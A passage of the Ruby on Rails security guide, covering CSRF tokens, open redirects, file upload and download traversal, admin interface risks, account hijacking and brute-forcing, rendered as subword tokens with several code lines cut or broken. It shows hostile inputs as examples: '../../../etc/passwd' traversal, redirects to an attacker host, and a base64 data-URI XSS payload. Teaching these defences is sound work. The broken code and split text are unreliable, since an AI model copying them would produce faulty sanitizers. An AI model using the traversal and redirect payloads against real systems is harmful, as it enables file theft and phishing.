▁< img ▁src =" http :// www . ha rm less . com / img " ▁ width =" 4 00 " ▁he ight =" 4 00 " ▁on m ous e over =" ..."
▁There ▁are ▁many ▁other ▁possibilities , ▁like ▁using ▁a ▁` < script >` ▁tag ▁to ▁make ▁a ▁c ross - site ▁request ▁to ▁a ▁URL ▁with ▁a ▁JSON P ▁or ▁JavaScript ▁response .
▁The ▁response ▁is ▁executable ▁code ▁that ▁the ▁attacker ▁can ▁find ▁a ▁way ▁to ▁run , ▁ possibl y ▁extract ing ▁ sensitive ▁data .
▁To ▁protect ▁again st ▁this ▁data ▁ le a k age , ▁we ▁d is allow ▁c ross - site ▁` < script >` ▁tags .
▁On ly ▁Ajax ▁requests ▁may ▁have ▁JavaScript ▁response s ▁since ▁ X m l Http Request ▁is ▁subject ▁to ▁the ▁browser ▁S a me - O r ig in ▁policy ▁- ▁meaning ▁only ▁your ▁site ▁can ▁in it i ate ▁the ▁request .
▁To ▁protect ▁again st ▁all ▁other ▁for g ed ▁requests , ▁we ▁introduce ▁a ▁ _ require d ▁security ▁token _ ▁that ▁our ▁site ▁know s ▁but ▁other ▁site s ▁don ' t ▁know .
▁We ▁include ▁the ▁security ▁token ▁in ▁requests ▁and ▁verify ▁it ▁on ▁the ▁server .
▁This ▁is ▁a ▁one - line r ▁in ▁your ▁application ▁controller , ▁and ▁is ▁the ▁default ▁for ▁new ly ▁created ▁rails ▁applications :
▁protect _ from _ forgery ▁with : ▁: exception
▁This ▁will ▁automatically ▁include ▁a ▁security ▁token ▁in ▁all ▁forms ▁and ▁Ajax ▁requests ▁generated ▁by ▁Rails .
▁If ▁the ▁security ▁token ▁does n ' t ▁match ▁what ▁was ▁expected , ▁an ▁exception ▁will ▁be ▁throw n .
▁It ▁is ▁common ▁to ▁use ▁ persistent ▁cookies ▁to ▁store ▁user ▁information , ▁with ▁` cookies . permanent ` ▁for ▁example .
▁In ▁this ▁case , ▁the ▁cookies ▁will ▁not ▁be ▁clear ed ▁and ▁the ▁out ▁of ▁the ▁box ▁CSRF ▁protect ion ▁will ▁not ▁be ▁effective .
▁If ▁you ▁are ▁using ▁a ▁different ▁cookie ▁store ▁than ▁the ▁session ▁for ▁this ▁information , ▁you ▁must ▁handle ▁what ▁to ▁do ▁with ▁it ▁yourself :
▁rescue _ from ▁ ActionController :: In valid Auth ent ic ity To k en ▁do ▁| exception |
▁sign _ out _ user ▁# ▁Example ▁method ▁that ▁will ▁destroy ▁the ▁user ▁cookies
▁The ▁above ▁method ▁can ▁be ▁placed ▁in ▁the ▁` Application Controller ` ▁and ▁will ▁be ▁called ▁when ▁a ▁CSRF ▁token ▁is ▁not ▁present ▁or ▁is ▁in correct ▁on ▁a ▁non - GET ▁request .
▁Note ▁that ▁ _ c ross - site ▁ script ing ▁( X SS ) ▁vulnerabilities ▁bypass ▁all ▁CSRF ▁protect ion s _ .
▁ X SS ▁gives ▁the ▁attacker ▁access ▁to ▁all ▁elements ▁on ▁a ▁page , ▁so ▁they ▁can ▁read ▁the ▁CSRF ▁security ▁token ▁from ▁a ▁form ▁or ▁directly ▁submit ▁the ▁form .
▁ Redirect ion ▁and ▁File s
▁--------------- ------
▁A nother ▁class ▁of ▁security ▁vulnerabilities ▁ s ur r ound s ▁the ▁use ▁of ▁redirect ion ▁and ▁files ▁in ▁web ▁applications .
▁### ▁ Redirect ion
▁WARNING : ▁ _ Redirect ion ▁in ▁a ▁web ▁application ▁is ▁an ▁under est i m at ed ▁c rack er ▁tool : ▁No t ▁only ▁can ▁the ▁attacker ▁forward ▁the ▁user ▁to ▁a ▁tr ap ▁web ▁site , ▁they ▁may ▁also ▁create ▁a ▁self - contain ed ▁attack .
▁When ever ▁the ▁user ▁is ▁allowed ▁to ▁pass ▁( part s ▁of ) ▁the ▁URL ▁for ▁redirect ion , ▁it ▁is ▁ possibl y ▁vulnerable .
▁The ▁most ▁obvious ▁attack ▁would ▁be ▁to ▁redirect ▁users ▁to ▁a ▁fake ▁web ▁application ▁which ▁look s ▁and ▁feel s ▁exactly ▁as ▁the ▁original ▁one .
▁This ▁so - called ▁ ph is h ing ▁attack ▁works ▁by ▁sending ▁an ▁un s us p ic ious ▁link ▁in ▁an ▁email ▁to ▁the ▁users , ▁inject ing ▁the ▁link ▁by ▁ X SS ▁in ▁the ▁web ▁application ▁or ▁ putting ▁the ▁link ▁into ▁an ▁external ▁site .
▁It ▁is ▁un s us p ic ious , ▁because ▁the ▁link ▁start s ▁with ▁the ▁URL ▁to ▁the ▁web ▁application ▁and ▁the ▁URL ▁to ▁the ▁ malicious ▁site ▁is ▁hidden ▁in ▁the ▁redirect ion ▁parameter : ▁ http :// www . example . com / site / redirect ? to = ▁ www . at t ac k er . com .
▁Here ▁is ▁an ▁example ▁of ▁a ▁ le g ac y ▁action :
▁def ▁ le g ac y
▁redirect _ to ( params . update ( action : ' main ') )
▁This ▁will ▁redirect ▁the ▁user ▁to ▁the ▁main ▁action ▁if ▁they ▁tr i ed ▁to ▁access ▁a ▁ le g ac y ▁action .
▁The ▁in t ent ion ▁was ▁to ▁pre serve ▁the ▁URL ▁parameters ▁to ▁the ▁ le g ac y ▁action ▁and ▁pass ▁them ▁to ▁the ▁main ▁action .
▁However , ▁it ▁can ▁be ▁ exploit ed ▁by ▁attacker ▁if ▁they ▁included ▁a ▁host ▁key ▁in ▁the ▁URL :
▁ http :// www . example . com / site / le g ac y ? param 1 = x y & param 2 = 23 & host = www . at t ac k er . com
▁If ▁it ▁is ▁at ▁the ▁end ▁of ▁the ▁URL ▁it ▁will ▁hard ly ▁be ▁notice d ▁and ▁redirect s ▁the ▁user ▁to ▁the ▁attacker . com ▁host .
▁A ▁simple ▁countermeasure ▁would ▁be ▁to ▁ _ include ▁only ▁the ▁expected ▁parameters ▁in ▁a ▁ le g ac y ▁action _ ▁( a g a in ▁a ▁ white list ▁approach , ▁as ▁oppos ed ▁to ▁remov ing ▁un expected ▁parameters ).
▁ _ A n d ▁if ▁you ▁redirect ▁to ▁an ▁URL , ▁check ▁it ▁with ▁a ▁ white list ▁or ▁a ▁regular ▁expression _ .
▁#### ▁S el f - contain ed ▁ X SS
▁A nother ▁redirect ion ▁and ▁self - contain ed ▁ X SS ▁attack ▁works ▁in ▁Firefox ▁and ▁O p er a ▁by ▁the ▁use ▁of ▁the ▁data ▁protocol .
▁This ▁protocol ▁display s ▁its ▁contents ▁directly ▁in ▁the ▁browser ▁and ▁can ▁be ▁anything ▁from ▁HTML ▁or ▁JavaScript ▁to ▁entire ▁images :
▁` data : text / html ; base 64 , P H N j c m l w d D 5 h b G V y d C g n W F N T J y k 8 L 3 N j c m l w d D 4 K `
▁This ▁example ▁is ▁a ▁ Base 64 ▁ en code d ▁JavaScript ▁which ▁display s ▁a ▁simple ▁message ▁box .
▁In ▁a ▁redirect ion ▁URL , ▁an ▁attacker ▁could ▁redirect ▁to ▁this ▁URL ▁with ▁the ▁ malicious ▁code ▁in ▁it .
▁As ▁a ▁countermeasure , ▁ _ do ▁not ▁allow ▁the ▁user ▁to ▁supply ▁( part s ▁of ) ▁the ▁URL ▁to ▁be ▁redirect ed ▁to _ .
▁### ▁File ▁U p load s
▁NOTE : ▁ _ Make ▁sure ▁file ▁upload s ▁don ' t ▁overwrit e ▁important ▁files , ▁and ▁process ▁m edia ▁files ▁a synchronously .
▁M any ▁web ▁applications ▁allow ▁users ▁to ▁upload ▁files .
▁ _ File ▁names , ▁which ▁the ▁user ▁may ▁choose ▁( part ly ), ▁should ▁always ▁be ▁filter ed _ ▁as ▁an ▁attacker ▁could ▁use ▁a ▁ malicious ▁file ▁name ▁to ▁overwrit e ▁any ▁file ▁on ▁the ▁server .
▁If ▁you ▁store ▁file ▁upload s ▁at ▁/ v ar / www / upload s , ▁and ▁the ▁user ▁enter s ▁a ▁file ▁name ▁like ▁" . . / . . / . . / et c / pass w d ", ▁it ▁may ▁overwrit e ▁an ▁important ▁file .
▁Of ▁course , ▁the ▁Ruby ▁interpret er ▁would ▁need ▁the ▁appropriate ▁ permission s ▁to ▁do ▁so ▁- ▁one ▁more ▁reason ▁to ▁run ▁web ▁server s , ▁database ▁server s ▁and ▁other ▁program s ▁as ▁a ▁less ▁privilege d ▁Unix ▁user .
▁When ▁filter ing ▁user ▁input ▁file ▁names , ▁ _ do n ' t ▁try ▁to ▁remove ▁ malicious ▁parts _ .
▁T h in k ▁of ▁a ▁situation ▁where ▁the ▁web ▁application ▁remove s ▁all ▁" . . / " ▁in ▁a ▁file ▁name ▁and ▁an ▁attacker ▁uses ▁a ▁string ▁such ▁as ▁" . . . . / / " ▁- ▁the ▁result ▁will ▁be ▁" . . / ".
▁It ▁is ▁best ▁to ▁use ▁a ▁ white list ▁approach , ▁which ▁ _ check s ▁for ▁the ▁validity ▁of ▁a ▁file ▁name ▁with ▁a ▁set ▁of ▁accepted ▁characters _ .
▁This ▁is ▁oppos ed ▁to ▁a ▁blacklist ▁approach ▁which ▁attempt s ▁to ▁remove ▁not ▁allowed ▁characters .
▁Here ▁is ▁the ▁file ▁name ▁ sanitize r ▁from ▁the ▁[ attachment _ f u ▁plugin ]( https :// github . com / tech now e en i e / attachment _ f u / tree / master ) :
▁def ▁ sanitize _ filename ( filename )
▁filename . str ip . t ap ▁do ▁| name |
▁# ▁NOTE : ▁File . base name ▁does n ' t ▁work ▁right ▁with ▁Windows ▁paths ▁on ▁Unix
▁# ▁get ▁only ▁the ▁filename , ▁not ▁the ▁whole ▁path
▁name . sub !
▁/ \ A . * ( \ \ | \ / ) / , ▁ ''
▁# ▁F inally , ▁replace ▁all ▁non ▁ al ph an umeric , ▁ underscore
▁# ▁or ▁per io d s ▁with ▁ underscore
▁name . g sub !
▁\ - ] / , ▁' _ '
▁A ▁significant ▁d is ad v ant age ▁of ▁ s y n ch r on ous ▁process ing ▁of ▁file ▁upload s ▁( as ▁the ▁ attachment _ f u ▁plugin ▁may ▁do ▁with ▁images ), ▁is ▁its ▁ _ vulnerabilit y ▁to ▁d en i al - of - service ▁attacks _ .
▁An ▁attacker ▁can ▁ synchronously ▁start ▁image ▁file ▁upload s ▁from ▁many ▁computer s ▁which ▁increase s ▁the ▁server ▁load ▁and ▁may ▁eventual ly ▁c ra s h ▁or ▁sta ll ▁the ▁server .
▁The ▁solution ▁to ▁this ▁is ▁best ▁to ▁ _ process ▁m edia ▁files ▁a synchronously _ : ▁S a ve ▁the ▁m edia ▁file ▁and ▁ s ch ed ul e ▁a ▁process ing ▁request ▁in ▁the ▁database .
▁A ▁second ▁process ▁will ▁handle ▁the ▁process ing ▁of ▁the ▁file ▁in ▁the ▁background .
▁### ▁ Ex ec u table ▁Code ▁in ▁File ▁U p load s
▁WARNING : ▁ _ S our ce ▁code ▁in ▁uploaded ▁files ▁may ▁be ▁executed ▁when ▁placed ▁in ▁specific ▁directories .
▁Do ▁not ▁place ▁file ▁upload s ▁in ▁Rails ' ▁/ public ▁directory ▁if ▁it ▁is ▁Apache ' s ▁home ▁directory .
▁The ▁popular ▁Apache ▁web ▁server ▁has ▁an ▁option ▁called ▁Do c u ment R oo t .
▁This ▁is ▁the ▁home ▁directory ▁of ▁the ▁web ▁site , ▁everything ▁in ▁this ▁directory ▁ tree ▁will ▁be ▁served ▁by ▁the ▁web ▁server .
▁If ▁there ▁are ▁files ▁with ▁a ▁certain ▁file ▁name ▁extension , ▁the ▁code ▁in ▁it ▁will ▁be ▁executed ▁when ▁request ed ▁( m ight ▁require ▁some ▁options ▁to ▁be ▁set ).
▁Example s ▁for ▁this ▁are ▁P H P ▁and ▁C G I ▁files .
▁Now ▁think ▁of ▁a ▁situation ▁where ▁an ▁attacker ▁upload s ▁a ▁file ▁" file . c g i " ▁with ▁code ▁in ▁it , ▁which ▁will ▁be ▁executed ▁when ▁some one ▁ download s ▁the ▁file .
▁ _ If ▁your ▁Apache ▁Do c u ment R oo t ▁point s ▁to ▁Rails ' ▁/ public ▁directory , ▁do ▁not ▁put ▁file ▁upload s ▁in ▁it _ , ▁store ▁files ▁at ▁least ▁one ▁level ▁down w ar d s .
▁### ▁File ▁D own load s
▁NOTE : ▁ _ Make ▁sure ▁users ▁cannot ▁ download ▁arbitrar y ▁files .
▁Ju st ▁as ▁you ▁have ▁to ▁filter ▁file ▁names ▁for ▁upload s , ▁you ▁have ▁to ▁do ▁so ▁for ▁ download s .
▁The ▁send _ file ( ) ▁method ▁send s ▁files ▁from ▁the ▁server ▁to ▁the ▁client .
▁If ▁you ▁use ▁a ▁file ▁name , ▁that ▁the ▁user ▁entered , ▁without ▁filter ing , ▁any ▁file ▁can ▁be ▁ download ed :
▁send _ file (' / v ar / www / upload s / ' ▁ + ▁params [: filename ])
▁S i mp ly ▁pass ▁a ▁file ▁name ▁like ▁" . . / . . / . . / et c / pass w d " ▁to ▁ download ▁the ▁server ' s ▁login ▁information .
▁A ▁simple ▁solution ▁again st ▁this , ▁is ▁to ▁ _ check ▁that ▁the ▁request ed ▁file ▁is ▁in ▁the ▁expected ▁directory _ :
▁base name ▁= ▁File . expand _ path ( File . join ( File . d ir name ( _ _ F I LE _ _ ), ▁' . .
▁filename ▁= ▁File . expand _ path ( File . join ( base name , ▁@ file . public _ filename ) )
▁raise ▁if ▁base name ▁ !
▁File . expand _ path ( File . join ( File . d ir name ( filename ), ▁' . .
▁send _ file ▁filename , ▁d is position : ▁' in line '
▁A nother ▁( additional ) ▁approach ▁is ▁to ▁store ▁the ▁file ▁names ▁in ▁the ▁database ▁and ▁name ▁the ▁files ▁on ▁the ▁d is k ▁after ▁the ▁id s ▁in ▁the ▁database .
▁This ▁is ▁also ▁a ▁good ▁approach ▁to ▁avoid ▁possible ▁code ▁in ▁an ▁uploaded ▁file ▁to ▁be ▁executed .
▁The ▁ attachment _ f u ▁plugin ▁does ▁this ▁in ▁a ▁similar ▁way .
▁Intranet ▁and ▁ Admin ▁ Security
▁-------------- -------------
▁Intranet ▁and ▁administrati on ▁interface s ▁are ▁popular ▁attack ▁target s , ▁because ▁they ▁allow ▁privilege d ▁access .
▁A lthough ▁this ▁would ▁require ▁sever al ▁extra - security ▁me as ure s , ▁the ▁oppos ite ▁is ▁the ▁case ▁in ▁the ▁real ▁world .
▁In ▁200 7 ▁there ▁was ▁the ▁first ▁tailor - ma de ▁tr o j an ▁which ▁ s to le ▁information ▁from ▁an ▁Intranet , ▁name ly ▁the ▁" M on s ter ▁for ▁e mp lo y ers " ▁web ▁site ▁of ▁Mon s ter . com , ▁an ▁online ▁re c ru it ment ▁web ▁application .
▁T a il or - ma de ▁T r o j an s ▁are ▁very ▁rare , ▁so ▁far , ▁and ▁the ▁risk ▁is ▁quite ▁ low , ▁but ▁it ▁is ▁certain ly ▁a ▁possibility ▁and ▁an ▁example ▁of ▁how ▁the ▁security ▁of ▁the ▁client ▁host ▁is ▁important , ▁too .
▁However , ▁the ▁high est ▁thr e at ▁to ▁Intranet ▁and ▁ Admin ▁applications ▁are ▁ X SS ▁and ▁CSRF .  
▁** X SS ** ▁If ▁your ▁application ▁re - display s ▁ malicious ▁user ▁input ▁from ▁the ▁extra net , ▁the ▁application ▁will ▁be ▁vulnerable ▁to ▁ X SS . ▁User ▁names , ▁comments , ▁sp am ▁report s , ▁order ▁addresses ▁are ▁just ▁a ▁few ▁un common ▁examples , ▁where ▁there ▁can ▁be ▁ X SS .
▁Having ▁one ▁single ▁place ▁in ▁the ▁admin ▁interface ▁or ▁Intranet , ▁where ▁the ▁input ▁has ▁not ▁been ▁ sanitize d , ▁make s ▁the ▁entire ▁application ▁vulnerable .
▁P ossible ▁ exploit s ▁include ▁steal ing ▁the ▁privilege d ▁administrator ' s ▁cookie , ▁inject ing ▁an ▁i frame ▁to ▁steal ▁the ▁administrator ' s ▁password ▁or ▁install ing ▁ malicious ▁software ▁through ▁browser ▁security ▁hole s ▁to ▁take ▁over ▁the ▁administrator ' s ▁computer .
▁Re f er ▁to ▁the ▁Injection ▁section ▁for ▁countermeasure s ▁again st ▁ X SS .
▁It ▁is ▁ _ re com m end ed ▁to ▁use ▁the ▁Safe E rb ▁plugin _ ▁also ▁in ▁an ▁Intranet ▁or ▁administrati on ▁interface .
▁** CSRF ** ▁C ross - Site ▁ Request ▁For ge ry ▁( CSRF ), ▁also ▁known ▁as ▁C ross - Site ▁Re f er ence ▁For ge ry ▁( X S R F ), ▁is ▁a ▁g ig ant ic ▁attack ▁method , ▁it ▁allows ▁the ▁attacker ▁to ▁do ▁everything ▁the ▁administrator ▁or ▁Intranet ▁user ▁may ▁do .
▁As ▁you ▁have ▁already ▁seen ▁above ▁how ▁CSRF ▁works , ▁here ▁are ▁a ▁few ▁examples ▁of ▁what ▁attacker s ▁can ▁do ▁in ▁the ▁Intranet ▁or ▁admin ▁interface .
▁The ▁attacker s ▁sent ▁a ▁ malicious ▁e - mail , ▁with ▁CSRF ▁in ▁it , ▁to ▁M ex ic an ▁users .
▁The ▁e - mail ▁cl a i m ed ▁there ▁was ▁an ▁e - card ▁wait ing ▁for ▁them , ▁but ▁it ▁also ▁contain ed ▁an ▁image ▁tag ▁that ▁result ed ▁in ▁a ▁HTTP - GET ▁request ▁to ▁re config ure ▁the ▁user ' s ▁route r ▁( which ▁is ▁a ▁popular ▁model ▁in ▁M ex ic o ).
▁The ▁request ▁changed ▁the ▁D N S - settings ▁so ▁that ▁requests ▁to ▁a ▁M ex ic o - base d ▁b an k ing ▁site ▁would ▁be ▁map ped ▁to ▁the ▁attacker ' s ▁site .
▁Every one ▁who ▁access ed ▁the ▁b an k ing ▁site ▁through ▁that ▁route r ▁saw ▁the ▁attacker ' s ▁fake ▁web ▁site ▁and ▁ha d ▁their ▁credentials ▁stolen .
▁A nother ▁example ▁changed ▁Google ▁A d s en se ' s ▁e - mail ▁address ▁and ▁password ▁by .
▁If ▁the ▁victim ▁was ▁logged ▁into ▁Google ▁A d s en se , ▁the ▁administrati on ▁interface ▁for ▁Google ▁a d ve r t is e ment s ▁ ca mp a ig n s , ▁an ▁attacker ▁could ▁change ▁their ▁credentials .  
▁A nother ▁popular ▁attack ▁is ▁to ▁sp am ▁your ▁web ▁application , ▁your ▁blog ▁or ▁for um ▁to ▁pro p a g ate ▁ malicious ▁ X SS .
▁Of ▁course , ▁the ▁attacker ▁has ▁to ▁know ▁the ▁URL ▁structure , ▁but ▁most ▁Rails ▁URLs ▁are ▁quite ▁straightforward ▁or ▁they ▁will ▁be ▁easy ▁to ▁find ▁out , ▁if ▁it ▁is ▁an ▁open - source ▁application ' s ▁admin ▁interface .
▁The ▁attacker ▁may ▁even ▁do ▁1, 000 ▁ l uck y ▁guess es ▁by ▁just ▁including ▁ malicious ▁I M G - tag s ▁which ▁try ▁every ▁possible ▁combination .
▁For ▁ _ c ountermeasures ▁again st ▁CSRF ▁in ▁administrati on ▁interface s ▁and ▁Intranet ▁applications , ▁refer ▁to ▁the ▁countermeasure s ▁in ▁the ▁CSRF ▁section _ .
▁### ▁Add it ion al ▁P re ca u t ion s
▁The ▁common ▁admin ▁interface ▁works ▁like ▁this : ▁it ' s ▁located ▁at ▁ www . example . com / admin , ▁may ▁be ▁access ed ▁only ▁if ▁the ▁admin ▁flag ▁is ▁set ▁in ▁the ▁User ▁model , ▁re - display s ▁user ▁input ▁and ▁allows ▁the ▁admin ▁to ▁delete / add / edit ▁what ever ▁data ▁desired .
▁Here ▁are ▁some ▁though t s ▁about ▁this :
▁You ▁could ▁ _ in tr o d u ce ▁role s _ ▁for ▁the ▁admin ▁interface ▁to ▁limit ▁the ▁possibilities ▁of ▁the ▁attacker .
▁Or ▁how ▁about ▁ _ special ▁login ▁credentials _ ▁for ▁the ▁admin ▁interface , ▁other ▁than ▁the ▁one s ▁used ▁for ▁the ▁public ▁part ▁of ▁the ▁application .
▁Or ▁a ▁ _ special ▁password ▁for ▁very ▁serious ▁actions _ ?
▁* ▁Doe s ▁the ▁admin ▁really ▁have ▁to ▁access ▁the ▁interface ▁from ▁every where ▁in ▁the ▁world ?
▁T h in k ▁about ▁ _ limit ing ▁the ▁login ▁to ▁a ▁b un ch ▁of ▁source ▁ IP ▁addresses _ .
▁ Ex am ine ▁request . remote _ ip ▁to ▁find ▁out ▁about ▁the ▁user ' s ▁ IP ▁address .
▁This ▁is ▁not ▁b ul let - proof , ▁but ▁a ▁great ▁bar r i er .
▁Re member ▁that ▁there ▁m ight ▁be ▁a ▁ proxy ▁in ▁use , ▁though .
▁* ▁ _ P u t ▁the ▁admin ▁interface ▁to ▁a ▁special ▁sub - domain _ ▁such ▁as ▁admin . application . com ▁and ▁make ▁it ▁a ▁separate ▁application ▁with ▁its ▁own ▁user ▁manage ment .
▁This ▁make s ▁steal ing ▁an ▁admin ▁cookie ▁from ▁the ▁usual ▁domain , ▁ www . application . com , ▁i mp ossible .
▁This ▁is ▁because ▁of ▁the ▁same ▁ origin ▁policy ▁in ▁your ▁browser : ▁An ▁inject ed ▁( X SS ) ▁ script ▁on ▁ www . application . com ▁may ▁not ▁read ▁the ▁cookie ▁for ▁admin . application . com ▁and ▁ v ic e - v ers a .
▁User ▁M an age ment
▁---------------
▁NOTE : ▁ _ A l most ▁every ▁web ▁application ▁has ▁to ▁deal ▁with ▁authorization ▁and ▁authentication .
▁Instead ▁of ▁roll ing ▁your ▁own , ▁it ▁is ▁a d v is able ▁to ▁use ▁common ▁plug - in s .
▁But ▁keep ▁them ▁up - to - date , ▁too .
▁A ▁few ▁ additional ▁precaution s ▁can ▁make ▁your ▁application ▁even ▁more ▁secure .
▁There ▁are ▁a ▁number ▁of ▁authentication ▁plug - in s ▁for ▁Rails ▁available .
▁G ood ▁one s , ▁such ▁as ▁the ▁popular ▁[ devise ]( https :// github . com / plat a format ec / devise ) ▁and ▁[ a u th log ic ]( https :// github . com / bin ary log ic / a u th log ic ), ▁store ▁only ▁encrypted ▁passwords , ▁not ▁plain - text ▁passwords .
▁In ▁Rails ▁3.1 ▁you ▁can ▁use ▁the ▁built - in ▁` has _ secure _ password ` ▁method ▁which ▁has ▁similar ▁features .
▁Every ▁new ▁user ▁get s ▁an ▁activation ▁code ▁to ▁activate ▁their ▁account ▁when ▁they ▁get ▁an ▁e - mail ▁with ▁a ▁link ▁in ▁it .
▁After ▁ activating ▁the ▁account , ▁the ▁activation _ code ▁columns ▁will ▁be ▁set ▁to ▁NULL ▁in ▁the ▁database .
▁If ▁some one ▁request ed ▁an ▁URL ▁like ▁these , ▁they ▁would ▁be ▁logged ▁in ▁as ▁the ▁first ▁ activated ▁user ▁found ▁in ▁the ▁database ▁( and ▁chance s ▁are ▁that ▁this ▁is ▁the ▁administrator ) :
▁ http :// localhost : 3 00 6 / user / ac t i v ate
▁ http :// localhost : 3 00 6 / user / ac t i v ate ? id =
▁This ▁is ▁possible ▁because ▁on ▁some ▁server s , ▁this ▁way ▁the ▁parameter ▁id , ▁as ▁in ▁params [: id ] , ▁would ▁be ▁nil .
▁However , ▁here ▁is ▁the ▁finder ▁from ▁the ▁activation ▁action :
▁User . find _ by _ activation _ code ( params [: id ])
▁If ▁the ▁parameter ▁was ▁nil , ▁the ▁result ing ▁SQL ▁query ▁will ▁be
▁`` ` sql
▁ SELECT ▁* ▁FROM ▁users ▁WHERE ▁( users . activation _ code ▁I S ▁NULL ) ▁LIMIT ▁1
▁And ▁thus ▁it ▁found ▁the ▁first ▁user ▁in ▁the ▁database , ▁returned ▁it ▁and ▁logged ▁them ▁in .
▁ _ It ▁is ▁a d v is able ▁to ▁update ▁your ▁plug - in s ▁from ▁time ▁to ▁time _ .
▁More over , ▁you ▁can ▁review ▁your ▁application ▁to ▁find ▁more ▁f la w s ▁like ▁this .
▁### ▁B r ute - For c ing ▁ Account s
▁NOTE : ▁ _ B r ute - force ▁attacks ▁on ▁account s ▁are ▁t rial ▁and ▁error ▁attacks ▁on ▁the ▁login ▁credentials .
▁F end ▁them ▁off ▁with ▁more ▁generic ▁error ▁messages ▁and ▁ possibl y ▁require ▁to ▁enter ▁a ▁ CAPTCHA . _
▁A ▁list ▁of ▁user ▁names ▁for ▁your ▁web ▁application ▁may ▁be ▁m is us ed ▁to ▁ br ute - force ▁the ▁corresponding ▁passwords , ▁because ▁most ▁people ▁don ' t ▁use ▁sophisticat ed ▁passwords .
▁ Most ▁passwords ▁are ▁a ▁combination ▁of ▁d ic t ion ary ▁words ▁and ▁ possibl y ▁number s .
▁So ▁a rm ed ▁with ▁a ▁list ▁of ▁user ▁names ▁and ▁a ▁d ic t ion ary , ▁an ▁automatic ▁program ▁may ▁find ▁the ▁correct ▁password ▁in ▁a ▁matter ▁of ▁minutes .
▁Because ▁of ▁this , ▁most ▁web ▁applications ▁will ▁display ▁a ▁generic ▁error ▁message ▁" user ▁name ▁or ▁password ▁not ▁correct ", ▁if ▁one ▁of ▁these ▁are ▁not ▁correct .
▁If ▁it ▁said ▁" the ▁user ▁name ▁you ▁entered ▁has ▁not ▁been ▁found ", ▁an ▁attacker ▁could ▁automatically ▁ compile ▁a ▁list ▁of ▁user ▁names .
▁However , ▁what ▁most ▁web ▁application ▁design ers ▁ n eg le c t , ▁are ▁the ▁ forgot - password ▁pages .
▁These ▁pages ▁often ▁a d m it ▁that ▁the ▁entered ▁user ▁name ▁or ▁e - mail ▁address ▁has ▁( not ) ▁been ▁found .
▁This ▁allows ▁an ▁attacker ▁to ▁ compile ▁a ▁list ▁of ▁user ▁names ▁and ▁ br ute - force ▁the ▁account s .
▁In ▁order ▁to ▁m it ig ate ▁such ▁attacks , ▁ _ display ▁a ▁generic ▁error ▁message ▁on ▁ forgot - password ▁pages , ▁too _ .
▁More over , ▁you ▁can ▁ _ require ▁to ▁enter ▁a ▁ CAPTCHA ▁after ▁a ▁number ▁of ▁failed ▁login s ▁from ▁a ▁certain ▁ IP ▁address _ .
▁Note , ▁however , ▁that ▁this ▁is ▁not ▁a ▁b ul let - proof ▁solution ▁again st ▁automatic ▁program s , ▁because ▁these ▁program s ▁may ▁change ▁their ▁ IP ▁address ▁exactly ▁as ▁often .
▁However , ▁it ▁raise s ▁the ▁bar r i er ▁of ▁an ▁attack .
▁### ▁ Account ▁H i j ac k ing
▁M any ▁web ▁applications ▁make ▁it ▁easy ▁to ▁ hijack ▁user ▁account s .
▁W h y ▁not ▁be ▁different ▁and ▁make ▁it ▁more ▁difficult ? .
▁#### ▁ Password s
▁T h in k ▁of ▁a ▁situation ▁where ▁an ▁attacker ▁has ▁stolen ▁a ▁user ' s ▁session ▁cookie ▁and ▁thus ▁may ▁co - use ▁the ▁application .
▁If ▁it ▁is ▁easy ▁to ▁change ▁the ▁password , ▁the ▁attacker ▁will ▁ hijack ▁the ▁account ▁with ▁a ▁few ▁click s .
▁Or ▁if ▁the ▁change - password ▁form ▁is ▁vulnerable ▁to ▁CSRF , ▁the ▁attacker ▁will ▁be ▁able ▁to ▁change ▁the ▁victim ' s ▁password ▁by ▁ l ur ing ▁them ▁to ▁a ▁web ▁page ▁where ▁there ▁is ▁a ▁ craft ed ▁I M G - tag ▁which ▁does ▁the ▁CSRF .
▁As ▁a ▁countermeasure , ▁ _ make ▁change - password ▁forms ▁safe ▁again st ▁CSRF _ , ▁of ▁course .
▁And ▁ _ require ▁the ▁user ▁to ▁enter ▁the ▁old ▁password ▁when ▁changing ▁it _ .
▁#### ▁E - Mail
▁However , ▁the ▁attacker ▁may ▁also ▁take ▁over ▁the ▁account ▁by ▁changing ▁the ▁e - mail ▁address .
▁After ▁they ▁change ▁it , ▁they ▁will ▁go ▁to ▁the ▁ forgot t en - password ▁page ▁and ▁the ▁( possibl y ▁new ) ▁password ▁will ▁be ▁mail ed ▁to ▁the ▁attacker ' s ▁e - mail ▁address .
▁As ▁a ▁countermeasure ▁ _ require ▁the ▁user ▁to ▁enter ▁the ▁password ▁when ▁changing ▁the ▁e - mail ▁address , ▁too _ .
▁#### ▁Other
▁De pending ▁on ▁your ▁web ▁application , ▁there ▁may ▁be ▁more ▁ways ▁to ▁ hijack ▁the ▁user ' s ▁account .
▁In ▁many ▁cases ▁CSRF ▁and ▁ X SS ▁will ▁help ▁to ▁do ▁so .
▁For ▁example , ▁as ▁in ▁a ▁CSRF ▁ vulnerabilit y ▁in ▁[ G oo g le ▁ Mail ]( http :// www . g n u c it ize n . org / blog / google - g mail - e - mail - hijack - tech n i q ue / ).
▁In ▁this ▁ proof - of - concept ▁attack , ▁the ▁victim ▁would ▁have ▁been ▁ l ur ed ▁to ▁a ▁web ▁site ▁control l ed ▁by ▁the ▁attacker .
▁On ▁that ▁site ▁is ▁a ▁ craft ed ▁I M G - tag ▁which ▁results ▁in ▁a ▁HTTP ▁GET ▁request ▁that ▁changes ▁the ▁filter ▁settings ▁of ▁Google ▁ Mail .
▁If ▁the ▁victim ▁was ▁logged ▁in ▁to ▁Google ▁ Mail , ▁the ▁attacker ▁would ▁change ▁the ▁filter s ▁to ▁forward ▁all ▁e - mail s ▁to ▁their ▁e - mail ▁address .
▁This ▁is ▁ nearly ▁as ▁harm ful ▁as ▁ hijack ing ▁the ▁entire ▁account .
▁As ▁a ▁countermeasure , ▁ _ re view ▁your ▁application ▁logic ▁and ▁eliminate ▁all ▁ X SS ▁and ▁CSRF ▁vulnerabilities _ .
▁### ▁ CAPTCHA s
▁INFO : ▁ _ A ▁ CAPTCHA ▁is ▁a ▁ cha ll en ge - response ▁test ▁to ▁determine ▁that ▁the ▁response ▁is ▁not ▁generated ▁by ▁a ▁computer .
▁It ▁is ▁often ▁used ▁to ▁protect ▁comment ▁forms ▁from ▁automatic ▁sp am ▁bot s ▁by ▁as k ing ▁the ▁user ▁to ▁type ▁the ▁letter s ▁of ▁a ▁d ist or t ed ▁image .
